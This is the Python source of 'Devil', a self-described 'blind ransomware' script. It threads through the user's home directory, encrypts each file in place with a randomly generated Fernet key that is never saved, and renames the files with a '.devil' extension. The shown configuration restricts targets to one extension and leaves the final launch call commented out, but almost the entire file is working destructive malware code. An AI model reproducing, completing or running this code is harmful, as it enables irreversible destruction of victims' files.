#!/usr/bin/env python3

"""
Devil v1.1.0

All rights reserved to (C) @SecVirus FOREVER

Email: secvirus[AT]proton[DOT]com
GitHub: https://www.github.com/isecvirus
InstaGram: https://www.instagram.com/secvirus


Devil is a blind ransomware, run once regret forever.
NEVER RUN IT ON A FRIENDLY MACHINE, THIS SCRIPT WILL..
ENCRYPT YOU FILES FOREVER AND YOU WILL NOT BEABLE TO..
RETRIEVE IT EVER AGAIN.
"""

import base64
import os  # required to validate & check file/directory existence and type.
import threading  # required to make process faster.
from pathlib import Path  # required for mapping all system for valid file names.

from cryptography.fernet import Fernet  # required for encryption


class File:
    def __init__(self):
        ...

    def split_filename(self, file: str):
        return os.path.split(file)[-1]

    def exists(self, file: str):
        return os.path.exists(file)

    def file(self, file: str):
        if self.exists(file):
            return os.path.isfile(file)

    def directory(self, dir: str):
        if self.exists(dir):
            return os.path.isdir(dir)

    def type(self, file: str) -> str:
        return 'file' if os.path.isfile(file) else 'directory' if os.path.isdir(file) else 'unknown'

    def size(self, file: str):
        if self.exists(file) and self.file(file=file):
            return os.stat(path=file).st_size

    def appropriate_size(self, value: int, min: int, max: int) -> bool:
        return value >= min and value <= max

    def ready_to_encrypt(self, file: str, min: int, max: int):
        exists = self.exists(file)
        if exists:
            size = self.size(file)
            return exists and self.file(file=file) and self.appropriate_size(value=size, min=min, max=max)

    def get_extension(self, file: str):
        if self.exists(file=file) and self.file(file=file):
            ext = os.path.splitext(p=file)
            if len(ext) > 1:
                return ext[-1][1:]


class Key:
    def __init__(self, key_length: int = 32):
        self.key_length = key_length  # encryption key should be of length 32, (static and final)
        self.key_bytes = os.urandom(self.key_length)  # encryption key bytes.
        self.key_in_b64 = base64.urlsafe_b64encode(self.key_bytes)  # encode the random bytes in base64.

    def generate(self) -> bytes:
        return Fernet(self.key_in_b64).generate_key()  # make a random one as a (final encryption key).


# print(Key().generate()) # run to get a unique encryption key

class Devil:
    def __init__(self, key: bytes = Key().generate()):
        self.unencrypted = []  # due to error or permissions problem or anything else.
        self.encrypted = []  # files got encrypted 100% successfully.
        self.in_progress = []  # files in encryption progress.

        self.extensions = ['devil']  # files with these extensions will be encrypted (leave blank to encrypt all).

        self.init_path = self.home_files()  # initial attack from (xyz) path.
        self.file = File()  # query object for a certain file.

        # the below numbers are in bytes.
        self.min_len = 1  # minimum size of a file to encrypt.
        self.max_len = ((1024 * 1024) * 1024) * 1  # maximum size of a file to encrypt DEFAULT:(1073741824=1GB).

        # ToDo:
        # ---------------------------------------------------------
        # self.directories_mapped = 0 # mapped directories counter.
        # self.directories_max_map = 0 # after this number of directories mapped the process will stop (zero for all).

        # self.files_mapped = 0 # mapped files counter.
        # self.files_max_map = 0 # after this number of files mapped the process will stop (zero for all).
        # ------------------------------------------------------------------------------------------------

        self.key = key
        self.fernet = Fernet(key=self.key)

    def encrypt(self, file: str):
        try:
            print("\rEncrypting =>", file, end='')
            with open(file, "rb") as file2read:
                file_data = file2read.read()
                with open(file, "wb") as file2write:
                    file2write.write(self.fernet.encrypt(data=file_data))
                file2write.close()
            file2read.close()
            print("\rEncrypted  =>", file)
            os.rename(src=file, dst=''.join(os.path.splitext(file)[:-1]) + ".devil")
            self.encrypted.append(file)
        except Exception:
            self.unencrypted.append(file)

        if file in self.in_progress:
            self.in_progress.remove(file)

    def map(self) -> None:
        def loop(directories=self.init_path):
            for path in directories:
                path = path.__str__()
                if self.file.directory(dir=path):
                    threading.Thread(target=loop, args=(Path(path).glob('*'),)).start()
                elif self.file.file(file=path):
                    if self.check(file=path):
                        self.in_progress.append(path)
                        threading.Thread(target=self.encrypt, args=(path,)).start()

        loop()

    def home_files(self):
        home_path = os.path.expanduser("~")  # get homepath EX:(C:\%USER%)/(/home/<USER>).
        return Path(home_path).glob('*')  # get all files in the home directory.

    def check(self, file):  # check for ability to encrypt
        if not file in self.encrypted:
            if self.file.ready_to_encrypt(file=file, min=self.min_len, max=self.max_len):
                if self.extensions:
                    extension = self.file.get_extension(file=file)
                    if not extension in self.extensions:
                        return False
                return True


devil = Devil()
#### devil.map()
